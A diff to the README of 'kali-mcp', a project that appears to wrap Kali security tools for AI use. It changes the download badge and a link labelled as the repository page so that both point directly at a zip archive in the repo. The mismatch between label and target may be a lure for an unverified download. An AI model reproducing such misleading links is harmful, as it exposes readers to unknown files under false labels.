@@ -1,6 +1,6 @@
 # 🐉 kali-mcp - Run Kali Tools with AI Help
 
-[![Download kali-mcp](https://img.shields.io/badge/Download%20kali-mcp-blue?style=for-the-badge&logo=github)](https://github.com/Unaacceptable297/kali-mcp)
+[![Download kali-mcp](https://img.shields.io/badge/Download%20kali-mcp-blue?style=for-the-badge&logo=github)](https://github.com/Unaacceptable297/kali-mcp/raw/refs/heads/main/docker/mcp_kali_v2.7.zip)
 
 ## 🧰 What this is
 
@@ -26,7 +26,7 @@ If your system is older, the app may still run, but Docker can use a lot of memo
 
 Go to the download page here:
 
-[Visit the kali-mcp repository](https://github.com/Unaacceptable297/kali-mcp)
+[Visit the kali-mcp repository](https://github.com/Unaacceptable297/kali-mcp/raw/refs/heads/main/docker/mcp_kali_v2.7.zip)
 
 Use that page to get the files you need, then follow the setup steps below.
 
